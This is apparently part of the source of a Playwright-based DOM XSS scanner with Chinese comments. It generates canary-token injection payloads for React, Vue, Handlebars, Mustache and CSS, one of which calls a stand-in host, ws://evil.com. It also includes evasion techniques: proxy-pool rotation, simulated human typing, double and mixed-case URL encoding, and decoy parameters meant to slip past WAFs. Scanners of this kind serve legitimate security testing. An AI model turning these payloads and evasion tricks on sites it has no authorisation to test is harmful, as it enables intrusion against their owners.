            payloads.append(self._get_vue_payload(vue_canary))
        
        # 4. 上下文感知载荷（精简版）
        if injection_point:
            context_canary = self._generate_context_aware_canary(injection_point)
            context_payload = self._generate_context_specific_payload(injection_point, context_canary)
            if context_payload:
                payloads.append(context_payload)
        
        # 5. 高级payload生成器 - 核心功能集成
        advanced_canary = self._generate_stealth_canary("js_var")
        
        # CSS注入payload
        payloads.extend(self._generate_css_injection_payloads(advanced_canary))
        
        # WebSocket/EventSource payload  
        payloads.extend(self._generate_websocket_payloads(advanced_canary))
        
        # 模板注入payload
        payloads.extend(self._generate_template_payloads(advanced_canary))
        
        # 隐蔽事件payload
        payloads.extend(self._generate_stealth_event_payloads(advanced_canary))
        
        # 存储所有canary tokens
        for payload in payloads:
            self.canary_tokens.add(payload.canary_token)
        
        return payloads  # 现在包含完整的高级检测载荷
    
    def _get_react_payload(self, canary: str) -> XSSPayload:
        """React专用payload"""
        return XSSPayload(
            name="React Component",
            payload=f'{{{{React.createElement("img", {{src: "x", onError: () => window.detectCanaryToken && window.detectCanaryToken("{canary}")}})}}}}',
            canary_token=canary,
            detection_method="js_execution",
            risk_level="high",
            framework_specificity="React",
            effectiveness_score=0.9,
            waf_bypass_score=0.8,
            stealth_score=0.7
        )
    
    def _get_vue_payload(self, canary: str) -> XSSPayload:
        """Vue专用payload"""
        return XSSPayload(
            name="Vue Template",
            payload=f'{{{{$el.ownerDocument.defaultView.detectCanaryToken && $el.ownerDocument.defaultView.detectCanaryToken("{canary}")}}}}',
            canary_token=canary,
            detection_method="js_execution",
            risk_level="high",
            framework_specificity="Vue",
            effectiveness_score=0.8,
            waf_bypass_score=0.7,
            stealth_score=0.6
        )
    

    
    def _generate_stealth_event_payloads(self, canary: str) -> List[XSSPayload]:
        """生成隐蔽的事件处理器载荷"""
        payloads = []
        
        # 延迟执行事件
        payloads.append(XSSPayload(
            name="延迟事件执行",
            payload=f'<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==" onload="setTimeout(() => {{window.detectCanaryToken && window.detectCanaryToken(\\"{canary}\\");}}, 100)">',
            canary_token=canary,
            detection_method="js_execution",
            risk_level="high"
        ))
        
        # 鼠标事件链
        mouse_canary = self._generate_stealth_canary("data_attr")
        payloads.append(XSSPayload(
            name="鼠标事件链",
            payload=f'<div onmouseover="this.click()" onclick="window.detectCanaryToken && window.detectCanaryToken(\\"{mouse_canary}\\"); this.remove()">hover me</div>',
            canary_token=mouse_canary,
            detection_method="js_execution",
            risk_level="medium"
        ))
        
        # 键盘事件
        key_canary = self._generate_stealth_canary("data_attr")
        payloads.append(XSSPayload(
            name="键盘事件触发",
            payload=f'<input type="text" onkeydown="if(event.key) window.detectCanaryToken && window.detectCanaryToken(\\"{key_canary}\\")" placeholder="type here">',
            canary_token=key_canary,
            detection_method="js_execution",
            risk_level="medium"
        ))
        
        return payloads
    
    def _generate_css_injection_payloads(self, canary: str) -> List[XSSPayload]:
        """生成CSS注入载荷"""
        payloads = []
        
        # CSS表达式 (IE兼容)
        payloads.append(XSSPayload(
            name="CSS表达式注入",
            payload=f'<div style="width: expression(window.detectCanaryToken && window.detectCanaryToken(\\"{canary}\\"));">',
            canary_token=canary,
            detection_method="js_execution", 
            risk_level="medium"
        ))
        
        # CSS动画事件
        css_canary = self._generate_stealth_canary("css_class")
        payloads.append(XSSPayload(
            name="CSS动画事件",
            payload=f'<style>@keyframes {css_canary} {{0%{{opacity:0}} 100%{{opacity:1}}}}</style><div style="animation: {css_canary} 0.1s" onanimationend="window.detectCanaryToken && window.detectCanaryToken(\\"{css_canary}\\")">',
            canary_token=css_canary,
            detection_method="js_execution",
            risk_level="medium"
        ))
        
        return payloads
    
    def _generate_template_payloads(self, canary: str) -> List[XSSPayload]:
        """生成模板引擎注入载荷"""
        payloads = []
        
        # Handlebars模板注入
        payloads.append(XSSPayload(
            name="Handlebars注入",
            payload=f'{{{{#with "constructor"}}}}{{{{#with ../constructor}}}}{{{{#with "call"}}}}{{{{#with ../call}}}}{{{{#with "arguments"}}}}{{{{#with ../arguments}}}}{{{{this.constructor.constructor("window.detectCanaryToken && window.detectCanaryToken(\\"{canary}\\")")()}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}',
            canary_token=canary,
            detection_method="js_execution",
            risk_level="high"
        ))
        
        # Mustache模板注入
        mustache_canary = self._generate_stealth_canary("js_var")
        payloads.append(XSSPayload(
            name="Mustache注入",
            payload=f'{{{{#lambda}}}}constructor.constructor("window.detectCanaryToken && window.detectCanaryToken(\\"{mustache_canary}\\")")(){{{{/lambda}}}}',
            canary_token=mustache_canary,
            detection_method="js_execution",
            risk_level="high"
        ))
        
        return payloads
    
    def _generate_websocket_payloads(self, canary: str) -> List[XSSPayload]:
        """生成WebSocket/EventSource注入载荷"""
        payloads = []
        
        # WebSocket连接注入
        payloads.append(XSSPayload(
            name="WebSocket注入",
            payload=f'<script>try{{new WebSocket("ws://evil.com").onopen=()=>window.detectCanaryToken&&window.detectCanaryToken("{canary}")}}catch(e){{}}</script>',
            canary_token=canary,
            detection_method="js_execution",
            risk_level="high"
        ))
        
        # EventSource注入
        sse_canary = self._generate_stealth_canary("js_var")
        payloads.append(XSSPayload(
            name="EventSource注入",
            payload=f'<script>try{{new EventSource("/events").onopen=()=>window.detectCanaryToken&&window.detectCanaryToken("{sse_canary}")}}catch(e){{}}</script>',
            canary_token=sse_canary,
            detection_method="js_execution",
            risk_level="medium"
        ))
        
        return payloads
    
    def _html_encode_payload(self, payload: str) -> str:
        """HTML实体编码载荷"""
        encoded = ""
        for char in payload:
            if char.isalnum() or char in ' -_':
                encoded += char
            else:
                encoded += f"&#{ord(char)};"
        return encoded
    
    def _generate_context_specific_payload(self, injection_point: Dict, canary: str) -> Optional[XSSPayload]:
        """根据注入点上下文生成特定的测试载荷"""
        point_type = injection_point.get('type', '')
        
        if point_type == 'form_input':
            input_name = injection_point.get('name', '').lower()
            if 'email' in input_name:
                # 邮箱输入框：使用看起来像邮箱的payload
                return XSSPayload(
                    name="邮箱字段注入",
                    payload=f'user.{canary}@test.com"><script>window.detectCanaryToken&&window.detectCanaryToken("{canary}")</script>',
                    canary_token=canary,
                    detection_method="js_execution",
                    risk_level="high"
                )
            elif 'search' in input_name:
                # 搜索框：使用搜索关键词格式
                return XSSPayload(
                    name="搜索字段注入",
                    payload=f'search {canary}"><img src=x onerror="window.detectCanaryToken&&window.detectCanaryToken(\'{canary}\')">',
                    canary_token=canary,
                    detection_method="js_execution",
                    risk_level="high"
                )
        
        elif point_type == 'url_parameter':
            # URL参数：使用编码后的payload
            return XSSPayload(
                name="URL参数注入",
                payload=f'{canary}%22%3E%3Cscript%3Ewindow.detectCanaryToken%26%26window.detectCanaryToken%28%22{canary}%22%29%3C/script%3E',
                canary_token=canary,
                detection_method="js_execution",
                risk_level="high"
            )
        
        return None
    
    async def _execute_xss_tests(self, injection_points: List[Dict], base_payloads: List[XSSPayload]):
        """基于付费代理的并发XSS测试"""
        
        # 利用代理池的并发能力
        if self.proxy_pool and self.browser:
            await self._execute_parallel_tests(injection_points, base_payloads)
        else:
            # 单页面测试
            await self._execute_single_page_tests(injection_points, base_payloads)
    
    async def _execute_parallel_tests(self, injection_points: List[Dict], base_payloads: List[XSSPayload]):
        """利用代理池并发测试"""
        print(f"        启动并发测试: {len(injection_points)} 个注入点")
        
        # 创建多个浏览器上下文，每个用不同代理
        contexts = []
        try:
            for i in range(min(self.max_concurrent, len(injection_points))):
                proxy = await self.proxy_pool.get_proxy(type="sticky")  # XSS测试用粘滞代理
                context = await self.browser.new_context(
                    proxy={"server": proxy["endpoint"]}
                )
                contexts.append(context)
            
            # 分配任务到不同上下文
            tasks = []
            for i, injection_point in enumerate(injection_points):
                context = contexts[i % len(contexts)]
                page = await context.new_page()
                
                # 基础payload + 上下文相关payload
                context_payload = self._generate_context_specific_payload(
                    injection_point, 
                    self._generate_context_aware_canary(injection_point)
                )
                test_payloads = base_payloads[:3]  # 减少payload数量，因为有代理
                if context_payload:
                    test_payloads.append(context_payload)
                
                task = self._test_with_page(page, injection_point, test_payloads)
                tasks.append(task)
            
            # 并发执行所有任务
            await asyncio.gather(*tasks, return_exceptions=True)
            
        finally:
            # 清理上下文
            for context in contexts:
                try:
                    await context.close()
                except:
                    pass
    
    async def _execute_single_page_tests(self, injection_points: List[Dict], base_payloads: List[XSSPayload]):
        """单页面测试（向后兼容）"""
        for injection_point in injection_points:
            # 基础payload + 上下文相关payload
            context_payload = self._generate_context_specific_payload(
                injection_point, 
                self._generate_context_aware_canary(injection_point)
            )
            test_payloads = base_payloads[:3]  # 精简版
            if context_payload:
                test_payloads.append(context_payload)
                
            for payload in test_payloads:
                await self._inject_payload(injection_point, payload)
                
                # 等待和检测
                await self.page.wait_for_timeout(self.config.detection_timeout)
                vulnerability = await self._detect_xss_vulnerability(injection_point, payload)
                
                if vulnerability:
                    self.vulnerabilities.append(vulnerability)
                    print(f"          发现漏洞: {vulnerability.severity}")
    
    async def _test_with_page(self, page: Page, injection_point: Dict, payloads: List[XSSPayload]):
        """使用独立页面测试"""
        try:
            # 导航到目标页面
            await page.goto(self.page.url, wait_until='domcontentloaded')
            
            # WAF欺骗检测 (代理页面)
            if self.waf_defender and self.waf_defender_initialized:
                adapter = await PlaywrightResponseAdapter.from_page_navigation(page, page.url)
                is_real = await self.waf_defender.validate(page.url, adapter, expected_type='html_page')
                if not is_real:
                    print(f"          🛡️  [代理] WAF欺骗检测: 跳过伪造响应")
                    return
            
            # 设置页面监控
            await self._setup_page_monitoring_for_page(page)
            
            # 执行payload测试
            for payload in payloads:
                await self._inject_payload_to_page(page, injection_point, payload)
                await page.wait_for_timeout(self.config.detection_timeout)
                
                vulnerability = await self._detect_xss_vulnerability_for_page(page, injection_point, payload)
                if vulnerability:
                    self.vulnerabilities.append(vulnerability)
                    print(f"          [代理] 发现漏洞: {vulnerability.severity}")
        except Exception as e:
            print(f"          代理测试失败: {e}")
        finally:
            try:
                await page.close()
            except Exception:
                pass
    
    async def _setup_page_monitoring_for_page(self, page: Page):
        """为代理页面设置监控（精简版）"""
        await page.add_init_script("""
            window.xss_canary_detections = [];
            window.detectCanaryToken = function(token) {
                window.xss_canary_detections.push({
                    token: token,
                    detected: true,
                    timestamp: Date.now()
                });
            };
        """)
    
    async def _inject_payload_to_page(self, page: Page, injection_point: Dict, payload: XSSPayload) -> bool:
        """向代理页面注入载荷"""
        try:
            point_type = injection_point['type']
            
            if point_type == 'form_input':
                selector = injection_point['selector']
                await page.click(selector)
                await page.fill(selector, payload.payload)
                return True
            elif point_type == 'url_parameter':
                # 构造带payload的URL
                current_url = page.url
                if '?' in current_url:
                    new_url = f"{current_url}&{injection_point['parameter']}={payload.payload}"
                else:
                    new_url = f"{current_url}?{injection_point['parameter']}={payload.payload}"
                await page.goto(new_url, wait_until='domcontentloaded')
                return True
                
            return False
        except Exception:
            return False
    
    async def _detect_xss_vulnerability_for_page(self, page: Page, injection_point: Dict, payload: XSSPayload):
        """检测代理页面的XSS漏洞"""
        try:
            # 检测canary token
            js_detections = await page.evaluate("() => window.xss_canary_detections || []")
            
            if any(detection['token'] == payload.canary_token for detection in js_detections):
                return self._create_vulnerability(injection_point, payload, "JavaScript执行检测")
            
            # 检测DOM注入
            dom_found = await page.evaluate("""
                (canary) => document.body.innerHTML.includes(canary)
            """, payload.canary_token)
            
            if dom_found:
                return self._create_vulnerability(injection_point, payload, "DOM内容注入")
                
            return None
        except Exception:
            return None
    
    # 精简版，移除复杂的评分逻辑
    
    # 删除复杂的并发控制逻辑，保持简单
    
    async def _test_injection_point(self, injection_point: Dict, payload: XSSPayload) -> bool:
        """测试单个注入点 - 精简版"""
        try:
            # 记录测试
            test_record = {
                'injection_point': injection_point,
                'payload': payload,
                'timestamp': datetime.now().isoformat(),
                'status': 'testing'
            }
            self.tested_inputs.append(test_record)
            
            # 执行注入测试
            success = await self._inject_payload(injection_point, payload)
            
            if success:
                # 等待页面响应
                await self.page.wait_for_timeout(self.config.detection_timeout)
                
                # 检测是否触发漏洞
                vulnerability = await self._detect_xss_vulnerability(injection_point, payload)
                
                if vulnerability:
                    self.vulnerabilities.append(vulnerability)
                    print(f"          发现漏洞: {vulnerability.severity}")
                    self._update_payload_stats(payload, True)
                else:
                    self._update_payload_stats(payload, False)
            else:
                self._update_payload_stats(payload, False)
            
            test_record['status'] = 'completed'
            return success
            
        except Exception as e:
            print(f"          测试错误: {e}")
            test_record['status'] = f'error: {e}'
            return False
    
    def _update_payload_stats(self, payload: XSSPayload, success: bool):
        """更新payload成功统计"""
        payload_name = payload.name
        if payload_name not in self.payload_success_stats:
            self.payload_success_stats[payload_name] = {'total': 0, 'success': 0}
        
        self.payload_success_stats[payload_name]['total'] += 1
        if success:
            self.payload_success_stats[payload_name]['success'] += 1
    
    async def _check_waf_response(self):
        """检测WAF响应并自适应调整"""
        try:
            # 检查页面状态和内容
            status_code = 200  # Playwright没有直接获取状态码的方法，这里简化处理
            page_content = await self.page.content()
            page_title = await self.page.title()
            
            # WAF检测关键词
            waf_indicators = [
                'blocked', 'forbidden', 'access denied', 'security',
                'cloudflare', 'incapsula', 'sucuri', 'firewall',
                '403', '406', '429', 'rate limit'
            ]
            
            content_lower = page_content.lower() + page_title.lower()
            
            if any(indicator in content_lower for indicator in waf_indicators):
                self.waf_detection_count += 1
                
                if self.waf_detection_count >= self.config.waf_detection_threshold:
                    if not self.waf_detected:
                        print(f"        检测到WAF防护，切换隐蔽模式")
                        self.waf_detected = True
                        self._adjust_strategy_for_waf()
        
        except Exception as e:
            print(f"        WAF检测失败: {e}")
    
    def _adjust_strategy_for_waf(self):
        """针对WAF调整扫描策略"""
        # 降低并发数
        self.config.concurrent_tests = max(1, self.config.concurrent_tests // 2)
        
        # 增加延迟
        self.config.page_wait_time *= 2
        
        # 提高隐蔽性要求
        self.config.min_payload_score = max(0.5, self.config.min_payload_score)
        
        print(f"        策略调整: 并发={self.config.concurrent_tests}, 延迟={self.config.page_wait_time}ms")
    
    async def _inject_payload(self, injection_point: Dict, payload: XSSPayload) -> bool:
        #向注入点注入测试载荷 
        try:
            point_type = injection_point['type']
            
            if point_type == 'form_input':
                return await self._inject_form_input(injection_point, payload)
            elif point_type == 'url_parameter':
                return await self._inject_url_parameter(injection_point, payload)
            elif point_type in ['hash_parameter', 'hash_fragment']:
                return await self._inject_hash_parameter(injection_point, payload)
            elif point_type == 'dom_property':
                return await self._inject_dom_property(injection_point, payload)
            
            return False
        except Exception as e:
            print(f"            注入失败: {e}")
            return False
    
    async def _inject_form_input(self, injection_point: Dict, payload: XSSPayload) -> bool:
        """向表单输入框注入载荷 - 模拟真实用户行为"""
        try:
            selector = injection_point['selector']
            
            # 模拟真实用户行为 - 随机延迟
            await self.page.wait_for_timeout(random.randint(200, 800))
            
            # 先点击获取焦点
            await self.page.click(selector)
            await self.page.wait_for_timeout(random.randint(100, 300))
            
            # 清空输入框 (模拟Ctrl+A + Delete)
            await self.page.keyboard.press("Control+a")
            await self.page.wait_for_timeout(50)
            await self.page.keyboard.press("Delete")
            
            # 分段输入payload (模拟打字速度)
            payload_text = payload.payload
            
            # WAF绕过技巧：分段输入
            if len(payload_text) > 20:
                # 长payload分段输入
                chunk_size = random.randint(5, 15)
                for i in range(0, len(payload_text), chunk_size):
                    chunk = payload_text[i:i+chunk_size]
                    await self.page.keyboard.type(chunk, delay=random.randint(50, 150))
                    await self.page.wait_for_timeout(random.randint(100, 300))
            else:
                # 短payload一次性输入
                await self.page.keyboard.type(payload_text, delay=random.randint(30, 100))
            
            # 随机触发不同事件
            trigger_events = ["Tab", "Enter"]
            if random.choice([True, False]):
                # 有时候先点击其他地方再回来
                await self.page.click("body")
                await self.page.wait_for_timeout(random.randint(100, 200))
                await self.page.click(selector)
            
            # 触发事件
            await self.page.press(selector, random.choice(trigger_events))
            await self.page.wait_for_timeout(random.randint(200, 500))
            
            return True
        except Exception as e:
            print(f"              表单注入失败: {e}")
            return False
    
    async def _inject_url_parameter(self, injection_point: Dict, payload: XSSPayload) -> bool:
        """向URL参数注入载荷 - 多种编码绕过WAF"""
        try:
            current_url = self.page.url
            parsed_url = urlparse(current_url)
            params = parse_qs(parsed_url.query)
            
            param_name = injection_point['parameter']
            payload_text = payload.payload
            
            # WAF绕过技巧：多种URL编码
            encoding_methods = [
                lambda x: x,  # 原始
                lambda x: urllib.parse.quote(x),  # URL编码
                lambda x: urllib.parse.quote(x, safe=''),  # 完全URL编码
                lambda x: urllib.parse.quote_plus(x),  # 加号编码
                lambda x: self._double_url_encode(x),  # 双重编码
                lambda x: self._mixed_case_encode(x),  # 混合大小写编码
            ]
            
            # 随机选择编码方法
            encode_method = random.choice(encoding_methods)
            encoded_payload = encode_method(payload_text)
            
            # 修改参数值
            params[param_name] = [encoded_payload]
            
            # 随机添加干扰参数 (WAF绕过)
            if random.choice([True, False]):
                decoy_params = ['utm_source', 'ref', 'debug', 'cache', 'v', 't']
                decoy_param = random.choice(decoy_params)
                decoy_value = f"{random.randint(1000, 9999)}"
                params[decoy_param] = [decoy_value]
            
            # 构造新URL
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # 模拟真实浏览行为 - 随机延迟
            await self.page.wait_for_timeout(random.randint(500, 1500))
            
            # 导航到新URL (模拟用户点击链接)
            await self.page.goto(new_url, wait_until='domcontentloaded', timeout=15000)
            
            # WAF欺骗检测
            if self.waf_defender and self.waf_defender_initialized:
                await self._validate_response_with_waf(new_url, expected_type='html_page')
            
            return True
        except Exception as e:
            print(f"              URL参数注入失败: {e}")
            return False
    
    def _double_url_encode(self, text: str) -> str:
        """双重URL编码"""
        first_encode = urllib.parse.quote(text, safe='')
        return urllib.parse.quote(first_encode, safe='')
    
    def _mixed_case_encode(self, text: str) -> str:
        """混合大小写十六进制编码"""
        encoded = ""
        for char in text:
            if char.isalnum():
                encoded += char
            else:
                hex_val = f"{ord(char):02x}"
                # 随机大小写
                if random.choice([True, False]):
                    hex_val = hex_val.upper()
                encoded += f"%{hex_val}"
        return encoded
    
    async def _inject_hash_parameter(self, injection_point: Dict, payload: XSSPayload) -> bool:
        #向Hash参数注入载荷 
        try:
            if injection_point['type'] == 'hash_fragment':
                # 整个hash替换
                new_hash = f"#{payload.payload}"
            else:
                # 参数替换
                param_name = injection_point['parameter']
                new_hash = f"#{param_name}={payload.payload}"
            
            # 更新hash
            await self.page.evaluate("window.location.hash = arguments[0]", new_hash)
            
            # 等待hash变化处理
            await self.page.wait_for_timeout(1000)
            
            return True
        except:
            return False
    
    async def _inject_dom_property(self, injection_point: Dict, payload: XSSPayload) -> bool:
        #向DOM属性注入载荷 
        try:
            selector = injection_point['selector']
            
            # 直接修改innerHTML
            await self.page.evaluate("""
                (selector, payload) => {
                    const element = document.querySelector(selector);
                    if (element) {
                        element.innerHTML = payload;
                        return true;
                    }
                    return false;
                }
            """, selector, payload.payload)
            
            return True
        except:
            return False
    
    async def _detect_xss_vulnerability(self, injection_point: Dict, payload: XSSPayload) -> Optional[XSSVulnerability]:
        """多维度XSS漏洞检测 - 终极版本"""
        try:
            vulnerability_found = False
            detection_contexts = []
            
            # 1. 传统canary token检测
            if payload.detection_method == "dom_search":
                dom_found = await self._detect_dom_injection(payload.canary_token)
                if dom_found:
                    vulnerability_found = True
                    detection_contexts.append("DOM内容注入")
            
            elif payload.detection_method == "js_execution":
                js_executed = await self._detect_javascript_execution(payload.canary_token)
                if js_executed:
                    vulnerability_found = True
                    detection_contexts.append("JavaScript执行")
            
            # 2. DOM变化检测 (新增)
            dom_mutations = await self._detect_dom_mutations()
            if dom_mutations:
                vulnerability_found = True
                detection_contexts.append(f"DOM结构变化({len(dom_mutations)}处)")
            
            # 3. JavaScript错误检测 (新增)
            js_errors = await self._detect_javascript_errors()
            if js_errors:
                detection_contexts.append(f"JavaScript错误({len(js_errors)}个)")
                # JS错误可能表明payload被解析但执行失败
            
            # 4. CSP违规检测 (新增)
            csp_violations = await self._detect_csp_violations()
            if csp_violations:
                vulnerability_found = True
                detection_contexts.append(f"CSP违规({len(csp_violations)}次)")
            
            # 5. 网络请求异常检测 (新增)
            suspicious_requests = await self._detect_suspicious_network_activity()
            if suspicious_requests:
                vulnerability_found = True
                detection_contexts.append(f"异常网络请求({len(suspicious_requests)}个)")
            
            # 6. 页面行为变化检测 (新增)
            behavior_changes = await self._detect_page_behavior_changes()
            if behavior_changes:
                vulnerability_found = True
                detection_contexts.append(f"页面行为异常({len(behavior_changes)}项)")
            
            if vulnerability_found:
                combined_context = " | ".join(detection_contexts)
                return self._create_vulnerability(injection_point, payload, combined_context)
            
            return None
            
        except Exception as e:
            print(f"检测错误: {e}")
            return None
    
    async def _detect_dom_injection(self, canary_token: str) -> bool:
        """检测DOM注入"""
        try:
            return await self.page.evaluate("""
                (canary) => {
                    // 检查多个位置
                    const locations = [
                        document.documentElement.innerHTML,
                        document.head.innerHTML,
                        document.body.innerHTML
                    ];
                    
                    return locations.some(html => html && html.includes(canary));
                }
            """, canary_token)
        except:
            return False
    
    async def _detect_javascript_execution(self, canary_token: str) -> bool:
        """检测JavaScript执行"""
        try:
            js_detections = await self.page.evaluate("""
                () => window.xss_canary_detections || []
            """)
            
            return any(detection['token'] == canary_token for detection in js_detections)
        except:
            return False
    
    async def _detect_dom_mutations(self) -> List[Dict]:
        """检测DOM变化"""
        try:
            mutations = await self.page.evaluate("""
                () => {
                    const mutations = window.xss_dom_mutations || [];
                    // 清空已检测的变化
                    window.xss_dom_mutations = [];
                    return mutations;
                }
            """)
            
            # 过滤出可能的XSS相关变化
            xss_mutations = []
            for mutation in mutations:
                content = mutation.get('content', '').lower()
                if any(keyword in content for keyword in ['script', 'onerror', 'onload', 'javascript:', 'eval(']):
                    xss_mutations.append(mutation)
            
            return xss_mutations
        except:
            return []
    
    async def _detect_javascript_errors(self) -> List[Dict]:
        """检测JavaScript错误"""
        try:
            # 获取控制台错误
            errors = await self.page.evaluate("""
                () => {
                    // 如果有错误监听器存储的错误
                    return window.xss_js_errors || [];
                }
            """)
            return errors
        except:
            return []
    
    async def _detect_csp_violations(self) -> List[Dict]:
        """检测CSP违规"""
        try:
            violations = await self.page.evaluate("""
                () => {
                    return window.xss_csp_violations || [];
                }
            """)
            return violations
        except:
            return []
    
    async def _detect_suspicious_network_activity(self) -> List[Dict]:
        """检测可疑的网络活动 - 智能噪音过滤版"""
        try:
            # 检查是否有异常的网络请求
            all_requests = await self.page.evaluate("""
                () => {
                    return window.xss_network_requests || [];
                }
            """)
            
            suspicious_requests = []
            total_requests = len(all_requests)
            filtered_count = 0
            
            for req in all_requests:
                url = req.get('url', '')
                method = req.get('method', 'GET')
                is_suspicious = False
                is_noise = False
                
                # 首先检查是否确实可疑
                if (url.startswith('javascript:') or 
                    url.startswith('data:') or
                    'evil.com' in url or
                    (method == 'POST' and url != self.page.url)):
                    is_suspicious = True
                
                # 然后检查是否是第三方噪音
                if NOISE_FILTER_AVAILABLE and not is_suspicious:
                    if is_third_party(url):
                        # 第三方请求，但检查是否有安全价值
                        if not has_security_value(url):
                            is_noise = True
                            filtered_count += 1
                            continue
                
                # 只有真正可疑的请求才添加
                if is_suspicious:
                    suspicious_requests.append(req)
                elif not is_noise:
                    # 非第三方噪音的普通请求，也可能有价值
                    if any(keyword in url.lower() for keyword in ['api', 'ajax', 'post', 'submit']):
                        suspicious_requests.append(req)
            
            # 噪音过滤统计
            if filtered_count > 0:
                noise_ratio = filtered_count / total_requests if total_requests > 0 else 0
                if noise_ratio > 0.5:
                    print(f"        网络请求噪音过滤: {filtered_count}/{total_requests} ({noise_ratio:.1%}) - 避免了网络请求傻逼兴奋")
                else:
                    print(f"        过滤了 {filtered_count} 个第三方网络请求")
            
            return suspicious_requests
            
        except Exception as e:
            print(f"        网络活动检测失败: {e}")
            return []
    
    async def _detect_page_behavior_changes(self) -> List[str]:
        """检测页面行为变化"""
        try:
            changes = []
            
            # 检查页面标题是否被修改
            title = await self.page.title()
            if 'xss' in title.lower() or 'test' in title.lower():
                changes.append("页面标题被修改")
            
            # 检查是否有新的弹窗
            dialogs = await self.page.evaluate("""
                () => window.xss_dialogs_triggered || false
            """)
            if dialogs:
                changes.append("触发了弹窗")
            
            # 检查是否有重定向
            current_url = self.page.url
            if 'javascript:' in current_url or 'data:' in current_url:
                changes.append("页面被重定向")
            
            return changes
        except:
            return []
    
    def _create_vulnerability(self, injection_point: Dict, payload: XSSPayload, detection_context: str) -> XSSVulnerability:
        #创建漏洞记录 
        return XSSVulnerability(
            vuln_id=f"XSS_{self.scan_id}_{len(self.vulnerabilities) + 1}",
            injection_point=json.dumps(injection_point),
            payload_used=payload.payload,
            canary_token=payload.canary_token,
            detection_method=detection_context,
            severity=payload.risk_level,
            url=self.page.url,
            dom_context=f"注入点类型: {injection_point.get('type', 'unknown')}",
            timestamp=datetime.now().isoformat()
        )
    
    async def _verify_vulnerabilities(self):
        #验证发现的漏洞 
        verified_vulns = []
        
        for vuln in self.vulnerabilities:
            # 二次验证
            try:
                # 生成新的验证canary
                verify_canary = f"VERIFY_{vuln.vuln_id}"
                
                # 简单的再次测试
                dom_clean = await self.page.evaluate("""
                    (canary) => !document.body.innerHTML.includes(canary)
                """, verify_canary)
                
                if dom_clean:
                    verified_vulns.append(vuln)
                else:
                    print(f"漏洞验证失败: {vuln.vuln_id}")
            except Exception as e:
                print(f"验证漏洞时出错 {vuln.vuln_id}: {e}")
        
        self.vulnerabilities = verified_vulns
    
    def _generate_scan_report(self, execution_time: float) -> Dict[str, Any]:
        #生成扫描报告 
        return {
            'scan_id': self.scan_id,
            'target_url': self.page.url,
            'scan_timestamp': datetime.now().isoformat(),
            'execution_time': f"{execution_time:.2f}秒",
            'scanner_version': 'v1.0',
            
            # 漏洞统计
            'vulnerability_summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'high_severity': len([v for v in self.vulnerabilities if v.severity == 'high']),
                'medium_severity': len([v for v in self.vulnerabilities if v.severity == 'medium']),
                'low_severity': len([v for v in self.vulnerabilities if v.severity == 'low'])
            },
            
            # 详细漏洞列表
            'vulnerabilities': [
                {
                    'id': vuln.vuln_id,
                    'severity': vuln.severity,
                    'detection_method': vuln.detection_method,
                    'injection_point': vuln.injection_point,
                    'payload': vuln.payload_used,
                    'url': vuln.url,
                    'timestamp': vuln.timestamp
                } for vuln in self.vulnerabilities
            ],
            
            # 统计
            'test_summary': {
                'total_injection_points': len(self.tested_inputs),
                'completed_tests': len([t for t in self.tested_inputs if t['status'] == 'completed']),
                'failed_tests': len([t for t in self.tested_inputs if 'error' in t['status']])
            },
            
            # 噪音过滤统计
            'noise_filtering_stats': {
                'filter_enabled': NOISE_FILTER_AVAILABLE,
                'total_findings': self.noise_stats['total_urls_found'],
                'noise_filtered': self.noise_stats['noise_filtered'],
                'valuable_findings': self.noise_stats['valuable_findings'],
                'noise_ratio': (self.noise_stats['noise_filtered'] / 
                              max(1, self.noise_stats['noise_filtered'] + self.noise_stats['valuable_findings'])),
                'effectiveness': '成功避免傻逼兴奋' if self.noise_stats['noise_filtered'] > self.noise_stats['valuable_findings'] else '正常扫描'
            },
            
            # WAF防护统计
            'waf_protection_stats': {
                'waf_defender_enabled': WAF_DEFENDER_AVAILABLE,
                'waf_defender_initialized': self.waf_defender_initialized,
                'target_url': self.page.url if self.page else 'unknown',
                'protection_status': '已启用WAF欺骗检测' if self.waf_defender_initialized else 
                                   ('WAF Defender不可用' if not WAF_DEFENDER_AVAILABLE else '未初始化'),
                'baseline_info': self.waf_defender.get_stats() if self.waf_defender else None
            },
            
            # 建议
            'security_recommendations': self._generate_security_recommendations()
        }
    
    def _generate_security_recommendations(self):
        #生成安全建议 
        recommendations = []
        
        if self.vulnerabilities:
            recommendations.extend([
                "立即修复发现的XSS漏洞",
                "对所有用户输入进行严格过滤和转义",
                "使用Content Security Policy (CSP)防护",
                "避免在DOM中直接插入未验证的内容"
            ])
        else:
            recommendations.append("未发现明显XSS漏洞，但建议定期进行安全检测")
        
        return recommendations
    
    
    def _create_error_result(self, error_message: str) -> Dict[str, Any]:
        #创建错误结果 
        return {
            'scan_id': self.scan_id,
            'target_url': self.page.url if self.page else 'unknown',
            'scan_timestamp': datetime.now().isoformat(),
            'error': error_message,
            'success': False,
            'vulnerability_summary': {'total_vulnerabilities': 0},
            'vulnerabilities': [],
            'test_summary': {'total_injection_points': 0}
        }


async def main():
    #主函数 
    if not PLAYWRIGHT_AVAILABLE:
        print("  Playwright未安装，无法运行DOM XSS扫描器")
        return
    
    # 这里可以添加逻辑
    print("  DOM XSS扫描器已准备就绪")

if __name__ == "__main__":
    asyncio.run(main()) 